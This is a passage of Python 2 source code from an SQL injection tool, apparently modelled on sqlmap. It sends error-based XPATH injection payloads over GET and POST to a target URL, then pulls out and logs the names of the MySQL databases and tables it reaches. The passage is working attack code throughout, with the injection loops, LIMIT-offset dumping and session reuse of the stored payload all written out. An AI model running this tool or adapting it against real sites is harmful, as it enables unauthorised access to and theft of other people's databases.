                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching database names"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of databases"
            for QueryIndex, inline_comment in product(DB_COUNT, (False, True)):
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % no_of_dbs
                                    dbvul = False
                                    for QueryIndex, inline_comment in product(DB_NAMES, (False, True)):
                                        if not dbvul:
                                            QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                            if '0x72306f74' in tempfread:
                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            dbvul = True
                                                            DbDumpQuery = FinalCountQuery_replaced
                                                            temp = 0
                                                            nod = int(no_of_dbs)
                                                            infos += "available databases ["+str(nod)+"]:\n"
                                                            tmp = ""
                                                            while temp < nod:
                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                elif 'LIMIT%200' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%20'+str(temp))
                                                                else:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                
                                                                try:
                                                                    req = Request(url, data=tempQuery, headers={'User-agent':ua})
                                                                    resp = urlopen(req, timeout=10)
                                                                except URLError as e:
                                                                    URLError()
                                                                    if temp==0:
                                                                        temp=0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except HTTPError as e:
##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                    sleep(1)
                                                                    pass
                                                                except (IOError, httplib.HTTPException) as e:
                                                                    ConnTimeOut()
                                                                    if temp==0:
                                                                        temp=0
                                                                    else:
                                                                        temp = temp
                                                                    pass
                                                                except KeyboardInterrupt:
                                                                    print fw + sn + "available databases ["+str(nod)+"]:"
                                                                    print fw + sn + tmp
                                                                    f.write(infos)
                                                                    f.close()
                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                    KeyBoardInterrupt()
                                                                    break
                                                                else:
                                                                    try:
                                                                        respdata = resp.read()
                                                                        name_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                        if 'XPATH syntax error' in respdata:
                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_dbs
                                                                            infos += "[*] %s\n" % name_of_dbs
                                                                            tmp += "[*] %s\n" % name_of_dbs
                                                                            list_of_dbs.append(name_of_dbs)
                                                                            temp += 1
                                                                            
                                                                    except IndexError as e:
                                                                        pass
                                                                    except Exception as e:
##                                                                        print '[-] %s' % e
##                                                                        sys.exit(0)
                                                                        pass
                                                                    except KeyboardInterrupt:
                                                                        KeyBoardInterrupt()
                                                                        break
                                                                
                                                            print fw + sn + "available databases ["+str(nod)+"]:"
                                                            print fw + sn + tmp
                                                                
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if dbvul:
                                            break
                            except IndexError as e:
                                pass
                            except Exception as e:
                                print '[-] %s' % e
                                sys.exit(0)
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
        
    else:
        pass



def  dumpTbl(url, data, db):

    global no_of_tbls
    global war,wsr
    global logs,payload
    HTTPReqCount = 0
    infos = ""
    dumps = []
#------------------------------------------
    f = open(logs,'a')              
#------------------------------------------
    if url != None and data == None:
        try:
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
                            else:
                                tgt = url + temp
                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
                                    for QueryIndex in TBL_COUNT_FROM_DBS:
                                        if not Query_Test:
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            QueryToDumpDbNames = FinalCountQuery_replaced
                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                                            # Query for dumping table
                                                            dbvul = False
                                                            for QueryIndex in TBL_DUMP_FROM_DBS:
                                                                if not dbvul:
                                                                    #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
                                                                    if '0x72306f74' in tgt:
                                                                        FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                                        try:
                                                                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=10)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            pass
                                                                        except KeyboardInterrupt:
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    dbvul = True
                                                                                    DbDumpQuery = FinalCountQuery_replaced
                                                                                    temp = 0
                                                                                    noT = int(no_of_tbls)
                                                                                    infos += "Database: %s\n"%db
                                                                                    infos += "["+str(noT)+" tables]\n"
                                                                                    #tmp = ""
                                                                                    while temp < noT:
                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                        elif 'LIMIT%200' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                                        else:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                                            
                                                                                        try:
                                                                                            req = Request(tempQuery, headers={'User-agent':ua})
                                                                                            resp = urlopen(req, timeout=10)
                                                                                        except URLError as e:
                                                                                            URLError()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except HTTPError as e:
##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except (IOError, httplib.HTTPException) as e:
                                                                                            ConnTimeOut()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except KeyboardInterrupt:
                                                                                            print fg + sb + "Database: %s" % db
                                                                                            print fg + sb + "[ Dumped "+str(temp)+" tables]:"
                                                                                            #print fg + sb + tmp
                                                                                            tab = pt(["tables"])
                                                                                            tab.align = "l"
                                                                                            tab.header = False
                                                                                            for tbl in dumps:
                                                                                                tab.add_row([tbl])
                                                                                                pass
                                                                                            print fg + sb + str(tab)
                                                                                            f.write(infos)
                                                                                            f.write(str(tab)+"\n")
                                                                                            f.close()
                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                                            KeyBoardInterrupt()
                                                                                            break
                                                                                        else:
                                                                                            try:
                                                                                                respdata = resp.read()
                                                                                                name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                if 'XPATH syntax error' in respdata:
                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
                                                                                                    #infos += "[*] %s\n" % name_of_tbls
                                                                                                    #tmp += "[*] %s\n" % name_of_tbls
                                                                                                    dumps.append(name_of_tbls)
                                                                                                    temp += 1
                                                                                                    
                                                                                            except IndexError as e:
                                                                                                pass
                                                                                            except Exception as e:
                                                                                                #print '[-] %s' % e
                                                                                                #sys.exit(0)
                                                                                                pass
                                                                                            except KeyboardInterrupt:
                                                                                                KeyBoardInterrupt()
                                                                                                break
                                                                                    print fg + sb + "Database: %s" %db
                                                                                    print fg + sb + "["+str(noT)+" tables]"
                                                                                    #print fg + sb + tmp
                                                                                    tab = pt(["tables]"])
                                                                                    tab.align = "l"
                                                                                    tab.header = False
                                                                                    for tbl in dumps:
                                                                                        tab.add_row([tbl])
                                                                                        pass
                                                                                    print fg + sb + str(tab) 
                                                                                        
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                #print '[-] %s' % e
                                                                               # sys.exit(0)
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                if dbvul:
                                                                    break
                                                                # TBL DUMP END
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break      
            f.write(infos)
            f.write(str(tab)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            Query_Test = False
            tempfread = tempf.readline()
            url = None
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
            for QueryIndex in TBL_COUNT_FROM_DBS:
                if not Query_Test:
                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    QueryToDumpDbNames = FinalCountQuery_replaced
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                    # Query for dumping table
                                    dbvul = False
                                    for QueryIndex in TBL_DUMP_FROM_DBS:
                                        if not dbvul:
                                            #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
                                            if '0x72306f74' in tempfread:
                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            dbvul = True
                                                            DbDumpQuery = FinalCountQuery_replaced
                                                            temp = 0
                                                            noT = int(no_of_tbls)
                                                            infos += "Database: %s\n" % db
                                                            infos += "["+str(noT)+" tables]\n"
                                                            #tmp = ""
                                                            while temp < noT:
                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                elif 'LIMIT%20' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                else:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                    
                                                                try:
                                                                    req = Request(tempQuery, headers={'User-agent':ua})
                                                                    resp = urlopen(req, timeout=10)
                                                                except URLError as e:
                                                                    URLError()
                                                                    if temp == 0:
                                                                        temp = 0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except HTTPError as e:
##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                    sleep(1)
                                                                    pass
                                                                except (IOError, httplib.HTTPException) as e:
                                                                    ConnTimeOut()
                                                                    if temp == 0:
                                                                        temp = 0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except KeyboardInterrupt:
                                                                    print fw + sn + "Database: %s" % db
                                                                    print fw + sn + "[Dumped "+str(temp)+" tables]"
                                                                    #print fw + sn + tmp
                                                                    tab = pt(["tables"])
                                                                    tab.align = "l"
                                                                    tab.header = False
                                                                    for tbl in dumps:
                                                                        tab.add_row([tbl])
                                                                        pass
                                                                    print fw + sn + str(tab) 
                                                                    f.write(infos)
                                                                    f.write(str(tab)+"\n")
                                                                    f.close()
                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                    KeyBoardInterrupt()
                                                                    break
                                                                else:
                                                                    try:
                                                                        respdata = resp.read()
                                                                        name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                        if 'XPATH syntax error' in respdata:
                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
                                                                            #infos += "[*] %s\n" % name_of_tbls
                                                                            #tmp += "[*] %s\n" % name_of_tbls
                                                                            dumps.append(name_of_tbls)
                                                                            temp += 1
                                                                            
                                                                    except IndexError as e:
                                                                        pass
                                                                    except Exception as e:
                                                                        #print '[-] %s' % e
                                                                       # sys.exit(0)
                                                                        pass
                                                                    except KeyboardInterrupt:
                                                                        KeyBoardInterrupt()
                                                                        break
                                                            print fw + sn + "Database: %s" % db
                                                            print fw + sn + "["+str(noT)+" tables]"
                                                            #print fw + sn + tmp
                                                            tab = pt(["tables"])
                                                            tab.align = "l"
                                                            tab.header = False
                                                            for tbl in dumps:
                                                                tab.add_row([tbl])
                                                                pass
                                                            print fw + sn + str(tab) 
                                                                
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if dbvul:
                                            break
                                        # TBL DUMP END
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                #sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.write(str(tab)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
#--------------------------------------------------------------------------------
#                           POST DATA
#--------------------------------------------------------------------------------            
    elif url != None and data != None:
        try:
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
                            else:
                                tgt = data + temp
                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break   
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                    
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
                                    for QueryIndex in TBL_COUNT_FROM_DBS:
                                        if not Query_Test:
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                                            dbvul = False
                                                            for QueryIndex in TBL_DUMP_FROM_DBS:
                                                                if not dbvul:
                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
                                                                    if '0x72306f74' in tgt:
                                                                        FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                                        try:
                                                                            req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=10)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            pass
                                                                        except KeyboardInterrupt:
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    dbvul = True
                                                                                    DbDumpQuery = FinalDumpQuery_replaced
                                                                                    temp = 0
                                                                                    noT = int(no_of_tbls)
                                                                                    infos += "Database: %s\n" % dbs
                                                                                    infos += "["+str(noT)+" tables]\n"
                                                                                    #tmp = ""
                                                                                    while temp < noT:
                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                        elif 'LIMIT%20' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                                        else:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)

                                                                                        try:
                                                                                            req = Request(url, data=tempQuery, headers={'User-agent':ua})
                                                                                            resp = urlopen(req, timeout=10)
                                                                                        except URLError as e:
                                                                                            URLError()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except HTTPError as e:
##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except (IOError, httplib.HTTPException) as e:
                                                                                            ConnTimeOut()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            pass
                                                                                        except KeyboardInterrupt:
                                                                                            print fg + sb + "Database: %s" % db
                                                                                            print fg + sb + "[Dumped "+str(temp)+" tables]"
                                                                                            #print fg + sb + tmp
                                                                                            tab = pt(["tables"])
                                                                                            tab.align = "l"
                                                                                            tab.header = False
                                                                                            for tbl in dumps:
                                                                                                tab.add_row([tbl])
                                                                                                pass
                                                                                            print fg + sb + str(tab) 
                                                                                            f.write(infos)
                                                                                            f.write(str(tab)+"\n")
                                                                                            f.close()
                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                                            KeyBoardInterrupt()
                                                                                            break
                                                                                        else:
                                                                                            try:
                                                                                                respdata = resp.read()
